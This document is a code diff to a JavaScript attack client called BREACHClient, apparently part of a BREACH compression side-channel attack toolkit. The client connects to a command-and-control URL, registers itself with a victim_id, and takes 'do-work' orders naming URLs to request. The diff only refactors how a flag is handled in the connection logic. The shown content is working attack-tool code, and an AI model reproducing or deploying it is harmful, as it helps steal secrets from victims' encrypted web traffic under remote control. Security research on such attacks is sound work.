@@ -7,11 +7,10 @@ const BREACHClient = {
     MORE_WORK_TIMEOUT: 10000,
     _socket: null,
     init() {
-        let flag = 0;
         this._socket = io.connect(config.COMMAND_CONTROL_URL);
         this._socket.on('connect', () => {
             console.log('Connected');
-            this.noWork(flag);
+            this.noWork(0);
         });
         this._socket.on('do-work', (work) => {
             console.log('do-work message');
@@ -22,12 +21,11 @@ const BREACHClient = {
             console.log('Initialized');
         });
         this._socket.on('server-nowork', () => {
-            this.noWork(flag);
+            this.noWork(1);
         });
     },
     noWork(flag) {
         if (flag == 0) {
-            flag = 1;
             this._socket.emit('client-hello', {
                 victim_id: config.VICTIM_ID
             });
@@ -49,7 +47,7 @@ const BREACHClient = {
 
         // TODO: rate limiting
         if (typeof url == 'undefined') {
-            this.noWork();
+            this.noWork(1);
             return;
         }
         console.log('Got work: ', work);
